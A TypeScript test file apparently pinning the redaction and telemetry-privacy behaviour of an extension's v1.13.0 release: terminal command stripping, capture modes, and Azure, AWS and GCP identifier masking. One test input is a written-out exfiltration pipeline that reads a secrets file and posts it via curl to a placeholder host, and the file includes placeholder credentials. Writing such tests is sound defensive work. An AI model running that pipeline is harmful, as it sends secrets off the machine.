/**
 * v1.13.0 — enterprise-trust hardening tests.
 *
 * Pin the behaviour of every config/redactor/policy surface added in v1.13.0
 * so a future refactor can't quietly regress the security posture:
 *  - `terminalVerbOnly` strips arguments correctly across common command shapes
 *  - `resolveCaptureTerminalMode` honors back-compat (true/false) + enterprise override
 *  - `applyPreserveLevel` redacts the right fields and preserves the right ones
 *  - the new redactor rules catch cloud identifiers without false-positiving on
 *    git SHAs / timestamps / common prose
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { terminalVerbOnly } from '../sessionCapture';
import { resolveCaptureTerminalMode } from '../types';
import { applyPreserveLevel } from '../azureContext';
import { redact } from '../redactor';

// ── terminalVerbOnly ──────────────────────────────────────────────────────

test('terminalVerbOnly: bare verb returns verb only', () => {
  assert.equal(terminalVerbOnly('ls'), 'ls');
});

test('terminalVerbOnly: drops all arguments incl --password / --token', () => {
  const cmd =
    'az containerapp create --name app --resource-group rg --password supers3cret --env-vars FOO=bar';
  const got = terminalVerbOnly(cmd);
  assert.equal(got, 'az …');
  assert.doesNotMatch(got, /supers3cret/);
  assert.doesNotMatch(got, /--password|--env-vars|FOO=bar/);
});

test('terminalVerbOnly: pipelines keep only the LEFTMOST verb', () => {
  // Otherwise a `cat secret.txt | curl ...` would leak through.
  const got = terminalVerbOnly('cat /etc/secrets/db.env | base64 | curl -X POST -d @- http://x');
  assert.equal(got, 'cat …');
  assert.doesNotMatch(got, /base64|curl|secrets/);
});

test('terminalVerbOnly: strips common no-arg wrappers (sudo / env VAR= / time / nohup)', () => {
  // Wrappers that take their own arguments (e.g. `nice -n 10`) are best-effort —
  // the verb of interest may bleed through as the wrapper's flag if the wrapper
  // accepts an arg. We document this as known-limitation rather than tortured
  // regex; `metadata-only` mode is still net-safer than `full`.
  assert.equal(terminalVerbOnly('sudo apt install foo'), 'apt …');
  assert.equal(terminalVerbOnly('env DEBUG=1 npm test'), 'npm …');
  assert.equal(terminalVerbOnly('time make build'), 'make …');
  // Relative-path verbs are preserved as-is (we only collapse absolute paths).
  assert.equal(terminalVerbOnly('nohup ./worker.sh &'), './worker.sh …');
});

test('terminalVerbOnly: preserves npx <pkg> as the meaningful verb', () => {
  // Just "npx" would lose the actual package the user ran.
  assert.equal(terminalVerbOnly('npx prettier --write src'), 'npx prettier …');
  // Leading flags after npx are skipped so the meaningful package name shows.
  assert.equal(terminalVerbOnly('npx --yes @vscode/vsce package'), 'npx @vscode/vsce …');
});

test('terminalVerbOnly: path-y verbs collapse to basename', () => {
  assert.equal(terminalVerbOnly('/usr/local/bin/python3 train.py --epochs 50'), 'python3 …');
});

test('terminalVerbOnly: empty input returns empty', () => {
  assert.equal(terminalVerbOnly(''), '');
  assert.equal(terminalVerbOnly('   '), '');
});

test('terminalVerbOnly: sequencing (;, &&, ||) takes the first command', () => {
  assert.equal(terminalVerbOnly('npm test && npm run package && npx vsce publish'), 'npm …');
});

// ── resolveCaptureTerminalMode ─────────────────────────────────────────────

test('resolveCaptureTerminalMode: back-compat true → full', () => {
  assert.equal(resolveCaptureTerminalMode(true, false), 'full');
});

test('resolveCaptureTerminalMode: back-compat false → off', () => {
  assert.equal(resolveCaptureTerminalMode(false, false), 'off');
});

test('resolveCaptureTerminalMode: enum strings pass through', () => {
  assert.equal(resolveCaptureTerminalMode('off', false), 'off');
  assert.equal(resolveCaptureTerminalMode('metadata-only', false), 'metadata-only');
  assert.equal(resolveCaptureTerminalMode('full', false), 'full');
});

test('resolveCaptureTerminalMode: undefined → metadata-only (v1.13 default)', () => {
  assert.equal(resolveCaptureTerminalMode(undefined, false), 'metadata-only');
});

test('resolveCaptureTerminalMode: invalid value → metadata-only (defensive)', () => {
  assert.equal(resolveCaptureTerminalMode('verbose', false), 'metadata-only');
  assert.equal(resolveCaptureTerminalMode(42 as unknown, false), 'metadata-only');
});

test('resolveCaptureTerminalMode: enterpriseMode forces off regardless of user setting', () => {
  assert.equal(resolveCaptureTerminalMode(true, true), 'off');
  assert.equal(resolveCaptureTerminalMode('full', true), 'off');
  assert.equal(resolveCaptureTerminalMode('metadata-only', true), 'off');
});

// ── applyPreserveLevel ────────────────────────────────────────────────────

const RAW_SNAPSHOT = {
  capturedAt: '2026-06-27T12:00:00Z',
  subscriptionId: '11111111-2222-3333-4444-555555555555',
  subscriptionName: 'Dev Test Subscription',
  tenantId: 'aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee',
  resourceGroup: 'my-precious-rg',
  defaultLocation: 'eastus2',
  resourceIds: [
    '/subscriptions/11111111-2222-3333-4444-555555555555/resourceGroups/my-precious-rg/providers/Microsoft.Storage/storageAccounts/myacct',
    '/subscriptions/11111111-2222-3333-4444-555555555555/resourceGroups/my-precious-rg/providers/Microsoft.KeyVault/vaults/mykv',
  ],
  notes: undefined,
};

test('applyPreserveLevel: full returns the snapshot unchanged', () => {
  const out = applyPreserveLevel({ ...RAW_SNAPSHOT }, 'full');
  assert.deepEqual(out, RAW_SNAPSHOT);
});

test('applyPreserveLevel: none returns undefined (skip persist)', () => {
  const out = applyPreserveLevel({ ...RAW_SNAPSHOT }, 'none');
  assert.equal(out, undefined);
});

test('applyPreserveLevel: summary-only redacts IDs but preserves human breadcrumbs', () => {
  const out = applyPreserveLevel({ ...RAW_SNAPSHOT }, 'summary-only')!;
  // Human-readable fields stay.
  assert.equal(out.subscriptionName, 'Dev Test Subscription');
  assert.equal(out.defaultLocation, 'eastus2');
  assert.equal(out.capturedAt, RAW_SNAPSHOT.capturedAt);
  // Identifier fields become opaque [REDACTED:...]#suffix tags.
  assert.match(out.subscriptionId!, /^\[REDACTED:azure-subscription-id\]#[0-9a-f]+$/);
  assert.match(out.tenantId!, /^\[REDACTED:azure-tenant-id\]#[0-9a-f]+$/);
  assert.match(out.resourceGroup!, /^\[REDACTED:azure-resource-group\]#[0-9a-f]+$/);
  // Resource IDs summarised to type, not arbitrary path data.
  assert.equal(out.resourceIds?.length, 2);
  assert.match(out.resourceIds![0], /Microsoft\.Storage\/storageAccounts \(redacted\)/);
  assert.match(out.resourceIds![1], /Microsoft\.KeyVault\/vaults \(redacted\)/);
  // None of the raw IDs leak.
  for (const v of [
    out.subscriptionId,
    out.tenantId,
    out.resourceGroup,
    ...(out.resourceIds ?? []),
  ]) {
    assert.doesNotMatch(v!, /11111111-2222-3333-4444-555555555555/);
    assert.doesNotMatch(v!, /aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee/);
    assert.doesNotMatch(v!, /my-precious-rg/);
  }
});

test('applyPreserveLevel: summary-only same-input → same-suffix (deterministic correlation)', () => {
  const a = applyPreserveLevel({ ...RAW_SNAPSHOT }, 'summary-only')!;
  const b = applyPreserveLevel({ ...RAW_SNAPSHOT }, 'summary-only')!;
  assert.equal(a.subscriptionId, b.subscriptionId);
  assert.equal(a.tenantId, b.tenantId);
});

test('applyPreserveLevel: summary-only handles a partial snapshot without crashing', () => {
  const partial = { capturedAt: '2026-06-27T12:00:00Z', notes: 'az not signed in' };
  const out = applyPreserveLevel(partial, 'summary-only')!;
  assert.equal(out.notes, 'az not signed in');
  assert.equal(out.subscriptionId, undefined);
  assert.equal(out.resourceIds, undefined);
});

// ── Cloud-identifier redactor rules ───────────────────────────────────────

const OPTS = { redactSecrets: true, honorPrivateTags: true, detectHighEntropy: false };

test('redactor.azure-resource-path: redacts subscription + resourceGroup in ARM path', () => {
  const path =
    '/subscriptions/11111111-2222-3333-4444-555555555555/resourceGroups/prod-rg/providers/Microsoft.Storage/storageAccounts/acme';
  const r = redact(`Edited ARM resource at ${path}/blobServices/default`, OPTS);
  assert.match(r.text, /\[REDACTED:azure-subscription-id\]/);
  assert.match(r.text, /\[REDACTED:azure-resource-group\]/);
  // Path structure preserved so LM can still summarise.
  assert.match(
    r.text,
    /\/subscriptions\/\[REDACTED:azure-subscription-id\]#[0-9a-f]+\/resourceGroups\/\[REDACTED:azure-resource-group\]#[0-9a-f]+/,
  );
  // Resource type tail preserved.
  assert.match(r.text, /Microsoft\.Storage\/storageAccounts\/acme/);
  // Raw values are gone.
  assert.doesNotMatch(r.text, /11111111-2222-3333-4444-555555555555/);
  assert.doesNotMatch(r.text, /prod-rg/);
});

test('redactor.azure-resource-path: handles subscription-only paths', () => {
  const r = redact(
    'Listing /subscriptions/aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee/providers/Microsoft.Resources',
    OPTS,
  );
  assert.match(r.text, /\[REDACTED:azure-subscription-id\]/);
  assert.doesNotMatch(r.text, /aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee/);
});

test('redactor.aws-account-id: catches account ID in context', () => {
  const r = redact('AWS_ACCOUNT_ID=123456789012 and accountId: "987654321098"', OPTS);
  assert.match(r.text, /\[REDACTED:aws-account-id\]/);
  assert.doesNotMatch(r.text, /123456789012/);
  assert.doesNotMatch(r.text, /987654321098/);
});

test('redactor.aws-account-id: leaves bare 12-digit numbers alone (no context)', () => {
  // 12-digit number without "account" context — likely a timestamp / id / phone.
  // We rely on the entropy detector or named rules to catch real secrets;
  // false-positiving on every 12-digit string would be unusable.
  const r = redact('order #482910384720 placed at 2026-06-27T12:00:00Z', OPTS);
  assert.doesNotMatch(r.text, /\[REDACTED:aws-account-id\]/);
});

test('redactor.aws-arn-account: redacts the account-id segment of ARNs', () => {
  const r = redact(
    'Resource arn:aws:s3:us-east-1:123456789012:bucket/foo and arn:aws:iam::987654321098:role/MyRole',
    OPTS,
  );
  // Both 12-digit IDs masked.
  const matches = r.text.match(/\[REDACTED:aws-account-id\]/g);
  assert.ok(matches && matches.length >= 2, 'expected at least 2 aws-account-id redactions');
  assert.doesNotMatch(r.text, /123456789012/);
  assert.doesNotMatch(r.text, /987654321098/);
  // ARN structure preserved.
  assert.match(r.text, /arn:aws:s3:us-east-1:\[REDACTED:aws-account-id\]/);
});

test('redactor.gcp-project-id: catches project ID in context', () => {
  const r = redact('GOOGLE_CLOUD_PROJECT=my-awesome-prod-2026 deploying...', OPTS);
  assert.match(r.text, /\[REDACTED:gcp-project-id\]/);
  assert.doesNotMatch(r.text, /my-awesome-prod-2026/);
});

test('redactor.gcp-project-id: ignores bare strings (no context)', () => {
  // Avoid false-positiving every kebab-case name.
  const r = redact('deployed feature-flag-rollout to the demo environment', OPTS);
  assert.doesNotMatch(r.text, /\[REDACTED:gcp-project-id\]/);
});

test('redactor: existing rules unchanged (regression: AWS access key, GitHub PAT, email)', () => {
  const r = redact(
    'AKIAIOSFODNN7EXAMPLE and ghp_1234567890abcdefghijklmnopqrstuvwxyzAB user@example.com',
    OPTS,
  );
  assert.match(r.text, /\[REDACTED:aws-access-key\]/);
  assert.match(r.text, /\[REDACTED:github-token\]/);
  assert.match(r.text, /\[REDACTED:email\]/);
});
